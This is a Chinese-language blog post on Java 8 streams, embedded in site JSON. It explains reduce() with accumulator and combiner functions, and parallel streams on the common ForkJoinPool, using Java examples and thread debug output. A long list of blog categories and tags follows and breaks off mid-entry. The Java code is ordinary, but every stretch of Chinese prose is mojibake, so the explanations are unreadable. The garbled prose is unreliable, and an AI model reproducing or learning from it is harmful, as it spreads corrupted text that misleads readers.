æ‰€çœ‹åˆ°çš„ï¼Œç»“æœæ˜¯76ï¼Œä½†åœ¨å¼•æ“ç›–ä¸‹åˆ°åº•å‘ç”Ÿäº†ä»€ä¹ˆ?è®©æˆ‘ä»¬é€šè¿‡ä¸€äº›è°ƒè¯•è¾“å‡ºæ¥æ‰©å±•ä¸Šé¢çš„ä»£ç : Integer ageSum = persons .stream() .reduce(0, (sum, p) -> &#123; System.out.format(\"accumulator: sum=%s; person=%s\\n\", sum, p); return sum += p.age; &#125;, (sum1, sum2) -> &#123; System.out.format(\"combiner: sum1=%s; sum2=%s\\n\", sum1, sum2); return sum1 + sum2; &#125;);// accumulator: sum=0; person=Max// accumulator: sum=18; person=Peter// accumulator: sum=41; person=Pamela// accumulator: sum=64; person=David æ­£å¦‚ä½ æ‰€çœ‹åˆ°çš„ï¼Œç´¯åŠ å™¨å‡½æ•°å®Œæˆäº†æ‰€æœ‰çš„å·¥ä½œã€‚å®ƒé¦–å…ˆè¢«è°ƒç”¨ï¼Œåˆå§‹å€¼ä¸º0ï¼Œç¬¬ä¸€ä¸ªäººæ˜¯Maxã€‚åœ¨æ¥ä¸‹æ¥çš„ä¸‰ä¸ªæ­¥éª¤ä¸­ï¼Œæ€»å’Œéšç€æœ€åä¸€æ­¥çš„å¹´é¾„ä¸æ–­å¢åŠ ï¼Œç›´åˆ°76å²ã€‚ Wait what?åˆæˆå™¨(combiner)ä»æ¥æ²¡æœ‰è¢«è°ƒç”¨?å¹¶è¡Œæ‰§è¡ŒåŒä¸€ä¸ªæµå°†è§£é™¤ç§˜å¯†: Integer ageSum = persons .parallelStream() .reduce(0, (sum, p) -> &#123; System.out.format(\"accumulator: sum=%s; person=%s\\n\", sum, p); return sum += p.age; &#125;, (sum1, sum2) -> &#123; System.out.format(\"combiner: sum1=%s; sum2=%s\\n\", sum1, sum2); return sum1 + sum2; &#125;); // accumulator: sum=0; person=Pamela // accumulator: sum=0; person=David // accumulator: sum=0; person=Max // accumulator: sum=0; person=Peter // combiner: sum1=18; sum2=23 // combiner: sum1=23; sum2=12 // combiner: sum1=41; sum2=35 å¹¶è¡Œæ‰§è¡Œæ­¤æµä¼šå¯¼è‡´å®Œå…¨ä¸åŒçš„æ‰§è¡Œè¡Œä¸ºã€‚ç°åœ¨åˆå¹¶å™¨è¢«è°ƒç”¨äº†ã€‚ç”±äºç´¯åŠ å™¨æ˜¯å¹¶è¡Œè°ƒç”¨çš„ï¼Œå› æ­¤éœ€è¦åˆå¹¶å™¨å°†å•ç‹¬ç´¯åŠ çš„å€¼ç›¸åŠ ã€‚ è®©æˆ‘ä»¬åœ¨ä¸‹ä¸€ç« æ›´æ·±å…¥åœ°æ¢è®¨å¹¶è¡Œæµã€‚ å¹¶è¡Œæµ(Parallel Streams) æµå¯ä»¥å¹¶è¡Œæ‰§è¡Œï¼Œä»¥æé«˜å¤§é‡è¾“å…¥å…ƒç´ çš„è¿è¡Œæ—¶æ€§èƒ½ã€‚å¹¶è¡Œæµä½¿ç”¨é€šè¿‡é™æ€ForkJoinPool. commonpool()æ–¹æ³•å¯ç”¨çš„å…¬å…±ForkJoinPoolã€‚åº•å±‚çº¿ç¨‹æ± çš„å¤§å°æœ€å¤šä½¿ç”¨5ä¸ªçº¿ç¨‹â€”å–å†³äºå¯ç”¨çš„ç‰©ç†CPUå†…æ ¸çš„æ•°é‡: ForkJoinPool commonPool = ForkJoinPool.commonPool(); System.out.println(commonPool.getParallelism()); // 3 åœ¨æˆ‘çš„æœºå™¨ä¸Šï¼Œå…¬å…±æ± åˆå§‹åŒ–æ—¶çš„å¹¶è¡Œåº¦é»˜è®¤ä¸º3ã€‚è¿™ä¸ªå€¼å¯ä»¥é€šè¿‡è®¾ç½®ä»¥ä¸‹JVMå‚æ•°æ¥å¢åŠ æˆ–å‡å°‘: -Djava.util.concurrent.ForkJoinPool.common.parallelism=5 é›†åˆæ”¯æŒparallelStream()æ–¹æ³•æ¥åˆ›å»ºå…ƒç´ çš„å¹¶è¡Œæµã€‚æˆ–è€…ï¼Œæ‚¨å¯ä»¥åœ¨ç»™å®šæµä¸Šè°ƒç”¨ä¸­é—´æ–¹æ³•parallel()æ¥å°†é¡ºåºæµè½¬æ¢ä¸ºå¹¶è¡Œå¯¹åº”æµã€‚ ä¸ºäº†å°‘æè¿°å¹¶è¡Œæµçš„å¹¶è¡Œæ‰§è¡Œè¡Œä¸ºï¼Œä¸‹é¢çš„ä¾‹å­å°†å½“å‰çº¿ç¨‹çš„ä¿¡æ¯æ‰“å°åˆ°sout: Arrays.asList(\"a1\", \"a2\", \"b1\", \"c2\", \"c1\") .parallelStream() .filter(s -> &#123; System.out.format(\"filter: %s [%s]\\n\", s, Thread.currentThread().getName()); return true; &#125;) .map(s -> &#123; System.out.format(\"map: %s [%s]\\n\", s, Thread.currentThread().getName()); return s.toUpperCase(); &#125;) .forEach(s -> System.out.format(\"forEach: %s [%s]\\n\", s, Thread.currentThread().getName())); é€šè¿‡ç ”ç©¶è°ƒè¯•è¾“å‡ºï¼Œæˆ‘ä»¬åº”è¯¥æ›´å¥½åœ°ç†è§£å“ªäº›çº¿ç¨‹å®é™…ç”¨äºæ‰§è¡Œæµæ“ä½œ: filter: b1 [main] filter: a2 [ForkJoinPool.commonPool-worker-1] map: a2 [ForkJoinPool.commonPool-worker-1] filter: c2 [ForkJoinPool.commonPool-worker-3] map: c2 [ForkJoinPool.commonPool-worker-3] filter: c1 [ForkJoinPool.commonPool-worker-2] map: c1 [ForkJoinPool.commonPool-worker-2] forEach: C2 [ForkJoinPool.commonPool-worker-3] forEach: A2 [ForkJoinPool.commonPool-worker-1] map: b1 [main] forEach: B1 [main] filter: a1 [ForkJoinPool.commonPool-worker-3] map: a1 [ForkJoinPool.commonPool-worker-3] forEach: A1 [ForkJoinPool.commonPool-worker-3] forEach: C1 [ForkJoinPool.commonPool-worker-2] æ­£å¦‚æ‚¨å¯ä»¥çœ‹åˆ°çš„ï¼Œå¹¶è¡Œæµåˆ©ç”¨äº†å…¬å…±ForkJoinPoolä¸­çš„æ‰€æœ‰å¯ç”¨çº¿ç¨‹æ¥æ‰§è¡Œæµæ“ä½œã€‚è¿ç»­è¿è¡Œæ—¶çš„è¾“å‡ºå¯èƒ½ä¸åŒï¼Œå› ä¸ºå®é™…ä½¿ç”¨çš„ç‰¹å®šçº¿ç¨‹çš„è¡Œä¸ºæ˜¯ä¸ç¡®å®šçš„ã€‚ è®©æˆ‘ä»¬é€šè¿‡ä¸€ä¸ªé¢å¤–çš„æµæ“ä½œâ€”â€”sortæ¥æ‰©å±•è¿™ä¸ªç¤ºä¾‹: Arrays.asList(\"a1\", \"a2\", \"b1\", \"c2\", \"c1\") .parallelStream() .filter(s -> &#123; System.out.format(\"filter: %s [%s]\\n\", s, Thread.currentThread().getName()); return true; &#125;) .map(s -> &#123; System.out.format(\"map: %s [%s]\\n\", s, Thread.currentThread().getName()); return s.toUpperCase(); &#125;) .sorted((s1, s2) -> &#123; System.out.format(\"sort: %s &lt;> %s [%s]\\n\", s1, s2, Thread.currentThread().getName()); return s1.compareTo(s2); &#125;) .forEach(s -> System.out.format(\"forEach: %s [%s]\\n\", s, Thread.currentThread().getName())); ä¹ä¸€çœ‹ï¼Œç»“æœå¯èƒ½å¾ˆå¥‡æ€ª: filter: c2 [ForkJoinPool.commonPool-worker-3]filter: c1 [ForkJoinPool.commonPool-worker-2]map: c1 [ForkJoinPool.commonPool-worker-2]filter: a2 [ForkJoinPool.commonPool-worker-1]map: a2 [ForkJoinPool.commonPool-worker-1]filter: b1 [main]map: b1 [main]filter: a1 [ForkJoinPool.commonPool-worker-2]map: a1 [ForkJoinPool.commonPool-worker-2]map: c2 [ForkJoinPool.commonPool-worker-3]sort: A2 &lt;> A1 [main]sort: B1 &lt;> A2 [main]sort: C2 &lt;> B1 [main]sort: C1 &lt;> C2 [main]sort: C1 &lt;> B1 [main]sort: C1 &lt;> C2 [main]forEach: A1 [ForkJoinPool.commonPool-worker-1]forEach: C2 [ForkJoinPool.commonPool-worker-3]forEach: B1 [main]forEach: A2 [ForkJoinPool.commonPool-worker-2]forEach: C1 [ForkJoinPool.commonPool-worker-1] æ’åºä¼¼ä¹åªåœ¨ä¸»çº¿ç¨‹ä¸Šé¡ºåºæ‰§è¡Œã€‚å®é™…ä¸Šï¼Œåœ¨å¹¶è¡Œæµä¸Šæ’åºä½¿ç”¨äº†æ–°çš„Java 8æ–¹æ³•Arrays.parallelSort()ã€‚å¦‚Javadocä¸­æ‰€è¿°ï¼Œå¦‚æœæ’åºæ˜¯é¡ºåºæ‰§è¡Œè¿˜æ˜¯å¹¶è¡Œæ‰§è¡Œï¼Œè¯¥æ–¹æ³•å†³å®šæ•°ç»„çš„é•¿åº¦: å¦‚æœæŒ‡å®šæ•°ç»„çš„é•¿åº¦å°äºæœ€å°ç²’åº¦ï¼Œåˆ™ä½¿ç”¨é€‚å½“çš„Arrayså¯¹å…¶è¿›è¡Œæ’åºã€‚æ’åºæ–¹æ³•ã€‚ å›åˆ°ä¸Šä¸€èŠ‚çš„reduceç¤ºä¾‹ã€‚æˆ‘ä»¬å·²ç»å‘ç°ï¼Œcombinerå‡½æ•°åªåœ¨å¹¶è¡Œä¸­è°ƒç”¨ï¼Œè€Œä¸æ˜¯åœ¨é¡ºåºæµä¸­è°ƒç”¨ã€‚è®©æˆ‘ä»¬çœ‹çœ‹å“ªäº›çº¿ç¨‹çœŸæ­£æ¶‰åŠ: List&lt;Person> persons = Arrays.asList( new Person(\"Max\", 18), new Person(\"Peter\", 23), new Person(\"Pamela\", 23), new Person(\"David\", 12)); persons .parallelStream() .reduce(0, (sum, p) -> &#123; System.out.format(\"accumulator: sum=%s; person=%s [%s]\\n\", sum, p, Thread.currentThread().getName()); return sum += p.age; &#125;, (sum1, sum2) -> &#123; System.out.format(\"combiner: sum1=%s; sum2=%s [%s]\\n\", sum1, sum2, Thread.currentThread().getName()); return sum1 + sum2; &#125;); æ§åˆ¶å°è¾“å‡ºæ˜¾ç¤ºç´¯åŠ å™¨å’Œç»„åˆå™¨å‡½æ•°åœ¨æ‰€æœ‰å¯ç”¨çº¿ç¨‹ä¸Šå¹¶è¡Œæ‰§è¡Œ: accumulator: sum=0; person=Pamela; [main] accumulator: sum=0; person=Max; [ForkJoinPool.commonPool-worker-3] accumulator: sum=0; person=David; [ForkJoinPool.commonPool-worker-2] accumulator: sum=0; person=Peter; [ForkJoinPool.commonPool-worker-1] combiner: sum1=18; sum2=23; [ForkJoinPool.commonPool-worker-1] combiner: sum1=23; sum2=12; [ForkJoinPool.commonPool-worker-2] combiner: sum1=41; sum2=35; [ForkJoinPool.commonPool-worker-2] æ€»ä¹‹ï¼Œå¯ä»¥è¿™æ ·è¯´ï¼Œå¹¶è¡Œæµå¯ä»¥ä¸ºå…·æœ‰å¤§é‡è¾“å…¥å…ƒç´ çš„æµå¸¦æ¥å¾ˆå¥½çš„æ€§èƒ½æå‡ã€‚ä½†æ˜¯è¯·è®°ä½ï¼Œåƒreduceå’Œcollectè¿™æ ·çš„å¹¶è¡Œæµæ“ä½œéœ€è¦é¢å¤–çš„è®¡ç®—(åˆå¹¶æ“ä½œ)ï¼Œè¿™åœ¨é¡ºåºæ‰§è¡Œæ—¶æ˜¯ä¸éœ€è¦çš„ã€‚ æ­¤å¤–ï¼Œæˆ‘ä»¬è¿˜äº†è§£åˆ°æ‰€æœ‰å¹¶è¡Œæµæ“ä½œå…±äº«åŒä¸€ä¸ªjvmèŒƒå›´çš„å…¬å…±ForkJoinPoolã€‚å› æ­¤ï¼Œæ‚¨å¯èƒ½å¸Œæœ›é¿å…å®ç°ç¼“æ…¢é˜»å¡çš„æµæ“ä½œï¼Œå› ä¸ºè¿™å¯èƒ½ä¼šé™ä½åº”ç”¨ç¨‹åºä¸­ä¸¥é‡ä¾èµ–å¹¶è¡Œæµçš„å…¶ä»–éƒ¨åˆ†çš„é€Ÿåº¦ã€‚","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Java","slug":"æŠ€æœ¯å‘/Java","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.sizaif.com/tags/Java/"},{"name":"å­¦ä¹ ç¬”è®°","slug":"å­¦ä¹ ç¬”è®°","permalink":"https://www.sizaif.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"author":"sizaif"}],"categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Linux","slug":"æŠ€æœ¯å‘/Linux","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Linux/"},{"name":"C++","slug":"æŠ€æœ¯å‘/C","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/C/"},{"name":"Vxworks","slug":"æŠ€æœ¯å‘/C/Vxworks","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/C/Vxworks/"},{"name":"Docker","slug":"æŠ€æœ¯å‘/Docker","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Docker/"},{"name":"Clash","slug":"æŠ€æœ¯å‘/Clash","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Clash/"},{"name":"Master","slug":"Master","permalink":"https://www.sizaif.com/navigation/categories/Master/"},{"name":"LLVM","slug":"Master/LLVM","permalink":"https://www.sizaif.com/navigation/categories/Master/LLVM/"},{"name":"Win","slug":"Win","permalink":"https://www.sizaif.com/navigation/categories/Win/"},{"name":"SSL","slug":"æŠ€æœ¯å‘/SSL","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/SSL/"},{"name":"è®ºæ–‡","slug":"Master/è®ºæ–‡","permalink":"https://www.sizaif.com/navigation/categories/Master/%E8%AE%BA%E6%96%87/"},{"name":"Win","slug":"æŠ€æœ¯å‘/Win","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Win/"},{"name":"Azure","slug":"æŠ€æœ¯å‘/Azure","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Azure/"},{"name":"Rust","slug":"æŠ€æœ¯å‘/Rust","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Rust/"},{"name":"python","slug":"æŠ€æœ¯å‘/python","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/python/"},{"name":"LTE","slug":"æŠ€æœ¯å‘/LTE","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/LTE/"},{"name":"ç¬”è®°","slug":"ç¬”è®°","permalink":"https://www.sizaif.com/navigation/categories/%E7%AC%94%E8%AE%B0/"},{"name":"Wireshark","slug":"ç¬”è®°/Wireshark","permalink":"https://www.sizaif.com/navigation/categories/%E7%AC%94%E8%AE%B0/Wireshark/"},{"name":"æ¸¸æˆå‘","slug":"æ¸¸æˆå‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%B8%B8%E6%88%8F%E5%90%91/"},{"name":"TSW2","slug":"æ¸¸æˆå‘/TSW2","permalink":"https://www.sizaif.com/navigation/categories/%E6%B8%B8%E6%88%8F%E5%90%91/TSW2/"},{"name":"Hexo","slug":"æŠ€æœ¯å‘/Hexo","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Hexo/"},{"name":"æ‚è°ˆ","slug":"æ‚è°ˆ","permalink":"https://www.sizaif.com/navigation/categories/%E6%9D%82%E8%B0%88/"},{"name":"Mybatis","slug":"æŠ€æœ¯å‘/Mybatis","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Mybatis/"},{"name":"æ‚é¡¹","slug":"æŠ€æœ¯å‘/æ‚é¡¹","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/%E6%9D%82%E9%A1%B9/"},{"name":"å›¾åºŠ","slug":"æŠ€æœ¯å‘/å›¾åºŠ","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/%E5%9B%BE%E5%BA%8A/"},{"name":"Microsoft SEAL","slug":"æŠ€æœ¯å‘/Microsoft-SEAL","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Microsoft-SEAL/"},{"name":"Js","slug":"æŠ€æœ¯å‘/Js","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Js/"},{"name":"Java","slug":"æŠ€æœ¯å‘/Java","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Java/"},{"name":"Springboot","slug":"æŠ€æœ¯å‘/Springboot","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Springboot/"},{"name":"ç®—æ³•","slug":"æŠ€æœ¯å‘/ç®—æ³•","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/%E7%AE%97%E6%B3%95/"},{"name":"è·¯ç”±å™¨","slug":"æŠ€æœ¯å‘/è·¯ç”±å™¨","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/%E8%B7%AF%E7%94%B1%E5%99%A8/"},{"name":"æœºå™¨å­¦ä¹ ","slug":"æŠ€æœ¯å‘/æœºå™¨å­¦ä¹ ","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"æœºå™¨å­¦ä¹ ","slug":"æœºå™¨å­¦ä¹ ","permalink":"https://www.sizaif.com/navigation/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"VS2019","slug":"æŠ€æœ¯å‘/VS2019","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/VS2019/"},{"name":"Tensorflow","slug":"æœºå™¨å­¦ä¹ /Tensorflow","permalink":"https://www.sizaif.com/navigation/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/Tensorflow/"},{"name":"OpenCV","slug":"æœºå™¨å­¦ä¹ /OpenCV","permalink":"https://www.sizaif.com/navigation/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/OpenCV/"},{"name":"SSL","slug":"ç¬”è®°/SSL","permalink":"https://www.sizaif.com/navigation/categories/%E7%AC%94%E8%AE%B0/SSL/"},{"name":"Mysql","slug":"æŠ€æœ¯å‘/Mysql","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Mysql/"},{"name":"JAXB","slug":"ç¬”è®°/JAXB","permalink":"https://www.sizaif.com/navigation/categories/%E7%AC%94%E8%AE%B0/JAXB/"},{"name":"Git","slug":"æŠ€æœ¯å‘/Git","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Git/"},{"name":"Python","slug":"æŠ€æœ¯å‘/Python","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Python/"},{"name":"é¡¹ç›®","slug":"é¡¹ç›®","permalink":"https://www.sizaif.com/navigation/categories/%E9%A1%B9%E7%9B%AE/"},{"name":"å»ºç«™ç¬”è®°","slug":"å»ºç«™ç¬”è®°","permalink":"https://www.sizaif.com/navigation/categories/%E5%BB%BA%E7%AB%99%E7%AC%94%E8%AE%B0/"},{"name":"æ‚æ–‡","slug":"æ‚æ–‡","permalink":"https://www.sizaif.com/navigation/categories/%E6%9D%82%E6%96%87/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.sizaif.com/tags/Linux/"},{"name":"å¤šä¼šè¯","slug":"å¤šä¼šè¯","permalink":"https://www.sizaif.com/tags/%E5%A4%9A%E4%BC%9A%E8%AF%9D/"},{"name":"VxWorks","slug":"VxWorks","permalink":"https://www.sizaif.com/tags/VxWorks/"},{"name":"WorkBebch","slug":"WorkBebch","permalink":"https://www.sizaif.com/tags/WorkBebch/"},{"name":"OpenSSL","slug":"OpenSSL","permalink":"https://www.sizaif.com/tags/OpenSSL/"},{"name":"TLS","slug":"TLS","permalink":"https://www.sizaif.com/tags/TLS/"},{"name":"X509è¯ä¹¦è§£æ","slug":"X509è¯ä¹¦è§£æ","permalink":"https://www.sizaif.com/tags/X509%E8%AF%81%E4%B9%A6%E8%A7%A3%E6%9E%90/"},{"name":"HexStream","slug":"HexStream","permalink":"https://www.sizaif.com/tags/HexStream/"},{"name":"åª’ä½“åº“","slug":"åª’ä½“åº“","permalink":"https://www.sizaif.com/tags/%E5%AA%92%E4%BD%93%E5%BA%93/"},{"name":"æµåª’ä½“","slug":"æµåª’ä½“","permalink":"https://www.sizaif.com/tags/%E6%B5%81%E5%AA%92%E4%BD%93/"},{"name":"C++","slug":"C","permalink":"https://www.sizaif.com/tags/C/"},{"name":"Cmake","slug":"Cmake","permalink":"https://www.sizaif.com/tags/Cmake/"},{"name":"æ€§èƒ½æµ‹è¯•","slug":"æ€§èƒ½æµ‹è¯•","permalink":"https://www.sizaif.com/tags/%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/"},{"name":"Binutils","slug":"Binutils","permalink":"https://www.sizaif.com/tags/Binutils/"},{"name":"docker","slug":"docker","permalink":"https://www.sizaif.com/tags/docker/"},{"name":"vscode","slug":"vscode","permalink":"https://www.sizaif.com/tags/vscode/"},{"name":"æ±‡ç¼–","slug":"æ±‡ç¼–","permalink":"https://www.sizaif.com/tags/%E6%B1%87%E7%BC%96/"},{"name":"äºŒè¿›åˆ¶","slug":"äºŒè¿›åˆ¶","permalink":"https://www.sizaif.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"},{"name":"linux","slug":"linux","permalink":"https://www.sizaif.com/tags/linux/"},{"name":"Clash","slug":"Clash","permalink":"https://www.sizaif.com/tags/Clash/"},{"name":"fuzzing","slug":"fuzzing","permalink":"https://www.sizaif.com/tags/fuzzing/"},{"name":"LLVM","slug":"LLVM","permalink":"https://www.sizaif.com/tags/LLVM/"},{"name":"C/C++","slug":"C-C","permalink":"https://www.sizaif.com/tags/C-C/"},{"name":"void*","slug":"void","permalink":"https://www.sizaif.com/tags/void/"},{"name":"3090ti","slug":"3090ti","permalink":"https://www.sizaif.com/tags/3090ti/"},{"name":"å¤–ç½®æ˜¾å¡å","slug":"å¤–ç½®æ˜¾å¡å","permalink":"https://www.sizaif.com/tags/%E5%A4%96%E7%BD%AE%E6%98%BE%E5%8D%A1%E5%9D%9E/"},{"name":"idea","slug":"idea","permalink":"https://www.sizaif.com/tags/idea/"},{"name":"ECDHE","slug":"ECDHE","permalink":"https://www.sizaif.com/tags/ECDHE/"},{"name":"å¯†é’¥åå•†","slug":"å¯†é’¥åå•†","permalink":"https://www.sizaif.com/tags/%E5%AF%86%E9%92%A5%E5%8D%8F%E5%95%86/"},{"name":"execv","slug":"execv","permalink":"https://www.sizaif.com/tags/execv/"},{"name":"æ ‡ç­¾äºŒ","slug":"æ ‡ç­¾äºŒ","permalink":"https://www.sizaif.com/tags/%E6%A0%87%E7%AD%BE%E4%BA%8C/"},{"name":"typora","slug":"typora","permalink":"https://www.sizaif.com/tags/typora/"},{"name":"é€šä¿¡","slug":"é€šä¿¡","permalink":"https://www.sizaif.com/tags/%E9%80%9A%E4%BF%A1/"},{"name":"ç®¡é“","slug":"ç®¡é“","permalink":"https://www.sizaif.com/tags/%E7%AE%A1%E9%81%93/"},{"name":"è®ºæ–‡","slug":"è®ºæ–‡","permalink":"https://www.sizaif.com/tags/%E8%AE%BA%E6%96%87/"},{"name":"AFL","slug":"AFL","permalink":"https://www.sizaif.com/tags/AFL/"},{"name":"make","slug":"make","permalink":"https://www.sizaif.com/tags/make/"},{"name":"ubuntu","slug":"ubuntu","permalink":"https://www.sizaif.com/tags/ubuntu/"},{"name":"Master","slug":"Master","permalink":"https://www.sizaif.com/tags/Master/"},{"name":"fastboot","slug":"fastboot","permalink":"https://www.sizaif.com/tags/fastboot/"},{"name":"é©±åŠ¨","slug":"é©±åŠ¨","permalink":"https://www.sizaif.com/tags/%E9%A9%B1%E5%8A%A8/"},{"name":"miflash unlock","slug":"miflash-unlock","permalink":"https://www.sizaif.com/tags/miflash-unlock/"},{"name":"Azure","slug":"Azure","permalink":"https://www.sizaif.com/tags/Azure/"},{"name":"å¾®è½¯","slug":"å¾®è½¯","permalink":"https://www.sizaif.com/tags/%E5%BE%AE%E8%BD%AF/"},{"name":"rust","slug":"rust","permalink":"https://www.sizaif.com/tags/rust/"},{"name":"Rust","slug":"Rust","permalink":"https://www.sizaif.com/tags/Rust/"},{"name":"OIDC","slug":"OIDC","permalink":"https://www.sizaif.com/tags/OIDC/"},{"name":"OAuth2.0","slug":"OAuth2-0","permalink":"https://www.sizaif.com/tags/OAuth2-0/"},{"name":"Azure AD","slug":"Azure-AD","permalink":"https://www.sizaif.com/tags/Azure-AD/"},{"name":"python","slug":"python","permalink":"https://www.sizaif.com/tags/python/"},{"name":"soap","slug":"soap","permalink":"https://www.sizaif.com/tags/soap/"},{"name":"DNS","slug":"DNS","permalink":"https://www.sizaif.com/tags/DNS/"},{"name":"LTE","slug":"LTE","permalink":"https://www.sizaif.com/tags/LTE/"},{"name":"5G","slug":"5G","permalink":"https://www.sizaif.com/tags/5G/"},{"name":"[object Object]","slug":"object-Object","permalink":"https://www.sizaif.com/tags/object-Object/"},{"name":"USIM","slug":"USIM","permalink":"https://www.sizaif.com/tags/USIM/"},{"name":"Pcap","slug":"Pcap","permalink":"https://www.sizaif.com/tags/Pcap/"},{"name":"DPI","slug":"DPI","permalink":"https://www.sizaif.com/tags/DPI/"},{"name":"Wireshark","slug":"Wireshark","permalink":"https://www.sizaif.com/tags/Wireshark/"},{"name":"ASN.1","slug":"ASN-1","permalink":"https://www.sizaif.com/tags/ASN-1/"},{"name":"Docker","slug":"Docker","permalink":"https://www.sizaif.com/tags/Docker/"},{"name":"TSW2","slug":"TSW2","permalink":"https://www.sizaif.com/tags/TSW2/"},{"name":"Win","slug":"Win","permalink":"https://www.sizaif.com/tags/Win/"},{"name":"è„šæœ¬æ ¼å¼","slug":"è„šæœ¬æ ¼å¼","permalink":"https://www.sizaif.com/tags/%E8%84%9A%E6%9C%AC%E6%A0%BC%E5%BC%8F/"},{"name":"Hexo","slug":"Hexo","permalink":"https://www.sizaif.com/tags/Hexo/"},{"name":"æ‚è°ˆ","slug":"æ‚è°ˆ","permalink":"https://www.sizaif.com/tags/%E6%9D%82%E8%B0%88/"},{"name":"Java","slug":"Java","permalink":"https://www.sizaif.com/tags/Java/"},{"name":"Mybatis","slug":"Mybatis","permalink":"https://www.sizaif.com/tags/Mybatis/"},{"name":"å›¾åºŠ","slug":"å›¾åºŠ","permalink":"https://www.sizaif.com/tags/%E5%9B%BE%E5%BA%8A/"},{"name":"Waline","slug":"Waline","permalink":"https://www.sizaif.com/tags/Waline/"},{"name":"PicGo","slug":"PicGo","permalink":"https://www.sizaif.com/tags/PicGo/"},{"name":"Gitee","slug":"Gitee","permalink":"https://www.sizaif.com/tags/Gitee/"},{"name":"Seal","slug":"Seal","permalink":"https://www.sizaif.com/tags/Seal/"},{"name":"åŒæ€åŠ å¯†","slug":"åŒæ€åŠ å¯†","permalink":"https://www.sizaif.com/tags/%E5%90%8C%E6%80%81%E5%8A%A0%E5%AF%86/"},{"name":"Js","slug":"Js","permalink":"https://www.sizaif.com/tags/Js/"},{"name":"Layui","slug":"Layui","permalink":"https://www.sizaif.com/tags/Layui/"},{"name":"Jdk","slug":"Jdk","permalink":"https://www.sizaif.com/tags/Jdk/"},{"name":"Springboot","slug":"Springboot","permalink":"https://www.sizaif.com/tags/Springboot/"},{"name":"ç®—æ³•","slug":"ç®—æ³•","permalink":"https://www.sizaif.com/tags/%E7%AE%97%E6%B3%95/"},{"name":"è·¯ç”±å™¨","slug":"è·¯ç”±å™¨","permalink":"https://www.sizaif.com/tags/%E8%B7%AF%E7%94%B1%E5%99%A8/"},{"name":"Hyper-v","slug":"Hyper-v","permalink":"https://www.sizaif.com/tags/Hyper-v/"},{"name":"æœºå™¨å­¦ä¹ ","slug":"æœºå™¨å­¦ä¹ ","permalink":"https://www.sizaif.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"Tensorflow","slug":"Tensorflow","permalink":"https://www.sizaif.com/tags/Tensorflow/"},{"name":"VS2019","slug":"VS2019","permalink":"https://www.sizaif.com/tags/VS2019/"},{"name":"OpenCV","slug":"OpenCV","permalink":"https://www.sizaif.com/tags/OpenCV/"},{"name":"SSL","slug":"SSL","permalink":"https://www.sizaif.com/tags/SSL/"},{"name":"ç¬”è®°","slug":"ç¬”è®°","permalink":"https://www.sizaif.com/tags/%E7%AC%94%E8%AE%B0/"},{"name":"GnuTLS","slug":"GnuTLS","permalink":"https://www.sizaif.com/tags/GnuTLS/"},{"name":"WolfSSL","slug":"WolfSSL","permalink":"https://www.sizaif.com/tags/WolfSSL/"},{"name":"æ•™ç¨‹","slug":"æ•™ç¨‹","permalink":"https://www.siza